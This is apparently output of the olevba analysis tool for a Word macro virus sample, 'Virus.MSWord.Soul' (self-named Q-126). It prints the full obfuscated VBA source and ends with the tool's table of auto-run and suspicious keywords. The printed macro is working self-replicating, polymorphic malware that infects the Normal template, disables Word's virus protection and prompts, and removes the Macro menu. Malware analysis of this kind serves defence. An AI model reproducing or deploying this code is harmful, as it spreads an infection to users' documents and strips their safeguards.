olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Soul-620ff7fa0437e41569c57d2be79b21eef3dfa908
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Soul-620ff7fa0437e41569c57d2be79b21eef3dfa908 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim áÆ÷àÊë†ÛÚ»šÜ”(16, 2) As String
Private Sub Document_New()
Call Document_Open
End Sub

Private Sub Document_Open()
Const Õ¨Ò°ºùÜÖÇóì = "ActiveDocument"
On Error Resume Next
Select Case Õ¨Ò°ºùÜÖÇóì
Case "ActiveDocument"
    Set Ú˜¦�¹Áå›žµÍ = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set Š°Ý�¾±—äúû÷… = NormalTemplate.VBProject.VBComponents(1).CodeModule
Case "NormalTemplate"
    Set Š°Ý�¾±—äúû÷… = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set Ú˜¦�¹Áå›žµÍ = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If Day(Date) < 5 Then
    MsgBox "Q-126 infection", vbCritical, "Q-126"
    End If
End Select
SetAttr (NormalTemplate.Name), vbNormal
CommandBars("Tools").Controls("Macro").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "me") = "Q-126 Virus" '¥¡­åö‰Óòð™¢
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "version") = "2.45" '¥¡­åö‰Óòð™¢
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "date") = "20/05/1999" '¥¡­åö‰Óòð™¢
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "Polymorph") = "(10..14)*126" '¥¡­åö‰Óòð™¢
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "author") = "Lord Soulblighter" '»õè±¶‡¸ÅØ¿Ž
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Q-126", "origin") = "Belgium" 'Chr
If Š°Ý�¾±—äúû÷….Countoflines > 100 Then
Exit Sub
Else
Call Îß«ÊÈïø�ë©Î¼(Š°Ý�¾±—äúû÷…, Ú˜¦�¹Áå›žµÍ)
NormalTemplate.Save
End If
End Sub
Private Sub Document_Close()
End Sub
Private Function Îß«ÊÈïø�ë©Î¼(ByVal èî¡æò•®á„ã, †¼¹ýÐúØâ£âþï)
Dim –Í„À­£¿éŽÂ, »õè±¶‡¸ÅØ¿Ž, ¥¡­åö‰Óòð™¢ As Integer
Dim •Ñöä¾’—É�›½ As String
áÆ÷àÊë†ÛÚ»šÜ”(1, 1) = "áÆ÷àÊë†ÛÚ»šÜ”"
áÆ÷àÊë†ÛÚ»šÜ”(2, 1) = "Õ¨Ò°ºùÜÖÇóì"
áÆ÷àÊë†ÛÚ»šÜ”(3, 1) = "Ú˜¦�¹Áå›žµÍ"
áÆ÷àÊë†ÛÚ»šÜ”(4, 1) = "Š°Ý�¾±—äúû÷…"
áÆ÷àÊë†ÛÚ»šÜ”(5, 1) = "Îß«ÊÈïø�ë©Î¼"
áÆ÷àÊë†ÛÚ»šÜ”(6, 1) = "èî¡æò•®á„ã"
áÆ÷àÊë†ÛÚ»šÜ”(7, 1) = "†¼¹ýÐúØâ£âþï"
áÆ÷àÊë†ÛÚ»šÜ”(8, 1) = "–Í„À­£¿éŽÂ"
áÆ÷àÊë†ÛÚ»šÜ”(9, 1) = "»õè±¶‡¸ÅØ¿Ž"
áÆ÷àÊë†ÛÚ»šÜ”(10, 1) = "¥¡­åö‰Óòð™¢"
áÆ÷àÊë†ÛÚ»šÜ”(11, 1) = "•Ñöä¾’—É�›½"
áÆ÷àÊë†ÛÚ»šÜ”(12, 1) = "‹¬éé­Âá§Ö¤Þ"
áÆ÷àÊë†ÛÚ»šÜ”(13, 1) = "ËŒ¨™ÅœÔ¬ÆÔ"
áÆ÷àÊë†ÛÚ»šÜ”(14, 1) = "ç“¶ÉÌãŸ’ÙÞ¯¾"
áÆ÷àÊë†ÛÚ»šÜ”(15, 1) = "‚ç¶ª«§³�Ÿ±Ùœš"
áÆ÷àÊë†ÛÚ»šÜ”(16, 1) = "©¯Ø–Ý©¤öÛŽõß"
For »õè±¶‡¸ÅØ¿Ž = 1 To 16
    áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 2) = ËŒ¨™ÅœÔ¬ÆÔ
Next »õè±¶‡¸ÅØ¿Ž
»õè±¶‡¸ÅØ¿Ž = èî¡æò•®á„ã.Countoflines
For –Í„À­£¿éŽÂ = 1 To »õè±¶‡¸ÅØ¿Ž
    èî¡æò•®á„ã.©¯Ø–Ý©¤öÛŽõßLine –Í„À­£¿éŽÂ, "'"
Next –Í„À­£¿éŽÂ
»õè±¶‡¸ÅØ¿Ž = èî¡æò•®á„ã.Countoflines
For ¥¡­åö‰Óòð™¢ = 1 To †¼¹ýÐúØâ£âþï.Countoflines
•Ñöä¾’—É�›½ = †¼¹ýÐúØâ£âþï.Lines(¥¡­åö‰Óòð™¢, 1)
   Select Case •Ñöä¾’—É�›½
   Case "Const Õ¨Ò°ºùÜÖÇóì = ""ActiveDocument"""
       •Ñöä¾’—É�›½ = "Const Õ¨Ò°ºùÜÖÇóì = ""NormalTemplate"""
   Case "Const Õ¨Ò°ºùÜÖÇóì = ""NormalTemplate"""
       •Ñöä¾’—É�›½ = "Const Õ¨Ò°ºùÜÖÇóì = ""ActiveDocument"""
   Case "'"
       GoTo ‚ç¶ª«§³�Ÿ±Ùœš
   End Select
   èî¡æò•®á„ã.InsertLines (»õè±¶‡¸ÅØ¿Ž + ¥¡­åö‰Óòð™¢), ©¯Ø–Ý©¤öÛŽõß(•Ñöä¾’—É�›½)
‚ç¶ª«§³�Ÿ±Ùœš:
Next ¥¡­åö‰Óòð™¢
End Function
Private Function ©¯Ø–Ý©¤öÛŽõß(ç“¶ÉÌãŸ’ÙÞ¯¾ As String)
Dim •Ñöä¾’—É�›½ As String
Dim ‹¬éé­Âá§Ö¤Þ As Boolean
Dim ¥¡­åö‰Óòð™¢, »õè±¶‡¸ÅØ¿Ž As Integer
For »õè±¶‡¸ÅØ¿Ž = 1 To 16
‹¬éé­Âá§Ö¤Þ = True
While ‹¬éé­Âá§Ö¤Þ = True
  ‹¬éé­Âá§Ö¤Þ = False
  For ¥¡­åö‰Óòð™¢ = 1 To (Len(ç“¶ÉÌãŸ’ÙÞ¯¾) - Len(áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 1)) + 1)
    •Ñöä¾’—É�›½ = Mid(ç“¶ÉÌãŸ’ÙÞ¯¾, ¥¡­åö‰Óòð™¢, Len(áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 1)))
    If •Ñöä¾’—É�›½ = áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 1) Then
      ç“¶ÉÌãŸ’ÙÞ¯¾ = Left(ç“¶ÉÌãŸ’ÙÞ¯¾, ¥¡­åö‰Óòð™¢ - 1) & áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 2) & Right(ç“¶ÉÌãŸ’ÙÞ¯¾, Len(ç“¶ÉÌãŸ’ÙÞ¯¾) - ¥¡­åö‰Óòð™¢ - Len(áÆ÷àÊë†ÛÚ»šÜ”(»õè±¶‡¸ÅØ¿Ž, 1)) + 1)
      ‹¬éé­Âá§Ö¤Þ = True
    End If
 Next ¥¡­åö‰Óòð™¢
Wend
Next »õè±¶‡¸ÅØ¿Ž
©¯Ø–Ý©¤öÛŽõß = ç“¶ÉÌãŸ’ÙÞ¯¾
End Function
Private Function ËŒ¨™ÅœÔ¬ÆÔ()
Dim ¥¡­åö‰Óòð™¢ As Integer
ËŒ¨™ÅœÔ¬ÆÔ = ""
Randomize
¥¡­åö‰Óòð™¢ = Int((4 * Rnd) + 10)
While Len(ËŒ¨™ÅœÔ¬ÆÔ) < ¥¡­åö‰Óòð™¢
    Randomize
    ËŒ¨™ÅœÔ¬ÆÔ = ËŒ¨™ÅœÔ¬ÆÔ + Chr(Int((126 * Rnd) + 129))
Wend
End Function






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

